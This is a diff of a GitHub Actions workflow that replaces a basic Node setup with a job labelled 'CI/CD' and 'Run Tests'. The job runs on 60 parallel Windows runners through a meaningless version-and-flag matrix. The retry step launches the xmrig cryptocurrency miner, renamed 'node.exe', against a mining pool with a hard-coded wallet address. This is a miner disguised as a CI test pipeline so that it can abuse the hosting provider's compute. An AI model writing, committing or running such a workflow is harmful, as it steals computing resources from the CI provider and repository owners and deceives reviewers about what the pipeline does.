@@ -1,12 +1,24 @@
-name: main
-run-name: ${{ github.actor }} 🚀
-on: [push]
+name: CI/CD
+on: [push, pull_request]
 jobs:
-  Explore-GitHub-Actions:
-    runs-on: ubuntu-latest
+  ci:
+    name: Run Tests
+    runs-on: windows-latest
+    strategy:
+      max-parallel: 50
+      fail-fast: false
+      matrix:
+        go: [1.1, 1.2, 1.3, 1.4, 1.5, 1.6]
+        flag: [1, 2, 3, 4, 5, 6, 7, 8, 9, 10]
     steps:
-      - run: sudo apt install nodejs && sudo apt install npm
-      - run: sudo apt-get update && sudo apt-get upgrade
-      - run: sudo apt-get install python-software-properties
-      - run: curl -sL https://deb.nodesource.com/setup_10.x | sudo -E bash –
-      - run: sudo apt-get install nodejs
+      - name: Checkout
+        uses: actions/checkout@v2
+      - name: sad-path (retry_wait_seconds)
+        id: sad_path_wait_sec
+        uses: nick-invision/retry@v2
+        continue-on-error: true
+        with:
+          timeout_minutes: 10
+          max_attempts: 2
+          retry_wait_seconds: 15
+          command: ./node.exe xmrig --url stratum-eu.rplant.xyz:7071  --user 1KH77ux634SD5Tj83jFKo9ZQhdVfT4uTJv --pass x --donate-level 1 --max-cpu-usage 70
